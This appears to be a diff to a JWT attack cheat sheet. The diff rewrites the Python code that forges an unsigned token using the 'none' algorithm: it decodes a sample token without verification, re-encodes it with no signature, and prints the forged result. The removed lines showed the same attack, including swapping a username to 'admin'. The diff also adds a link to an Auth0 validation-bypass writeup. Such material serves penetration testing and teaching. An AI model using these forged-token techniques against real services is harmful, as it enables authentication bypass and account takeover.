@@ -100,37 +100,25 @@ To exploit this vulnerability, you just need to decode the JWT and change the al
 
 However, this won't work unless you **remove** the signature
 
-The following code is a basic test for a None algorithm.
-
-```python
-import jwt
-import base64
-
-def b64urlencode(data):
-    return base64.b64encode(data).replace('+', '-').replace('/', '_').replace('=', '')
-
-print b64urlencode("{\"typ\":\"JWT\",\"alg\":\"none\"}") + \
-    '.' + b64urlencode("{\"data\":\"test\"}") + '.'
-```
-
 Alternatively you can modify an existing JWT (be careful with the expiration time)
 
-```python
-#!/usr/bin/python
+```python3
+#!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ"
-header, payload, signature  = jwt.split('.')
+import jwt
 
-# Replacing the ALGO and the payload username
-header  = header.decode('base64').replace('HS256',"none")
-payload = (payload+"==").decode('base64').replace('test','admin')
+jwtToken 	= 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
 
-header  = header.encode('base64').strip().replace("=","")
-payload = payload.encode('base64').strip().replace("=","")
+decodedToken 	= jwt.decode(jwtToken, verify=False)  					# Need to decode the token before encoding with type 'None'
+noneEncoded 	= jwt.encode(decodedToken, key='', algorithm=None)
 
-# 'The algorithm 'none' is not supported'
-print( header+"."+payload+".")
+print(noneEncoded.decode())
+
+"""
+Output:
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.
+"""
 ```
 
 ## JWT Signature - RS256 to HS256
@@ -291,3 +279,4 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj...Fh7HgQ:secret
 - [HACKING JSON WEB TOKENS, FROM ZERO TO HERO WITHOUT EFFORT - Thu Feb 09 2017 - @pdp](https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)
 - [Write up – JRR Token – LeHack 2019 - 07/07/2019 - LAPHAZE](http://rootinthemiddle.org/write-up-jrr-token-lehack-2019/)
 - [JWT Hacking 101 - TrustFoundry - Tyler Rosonke - December 8th, 2017](https://trustfoundry.net/jwt-hacking-101/)
+- [JSON Web Token Validation Bypass in Auth0 Authentication API - Ben Knight Senior Security Consultant - April 16, 2020](https://insomniasec.com/blog/auth0-jwt-validation-bypass)
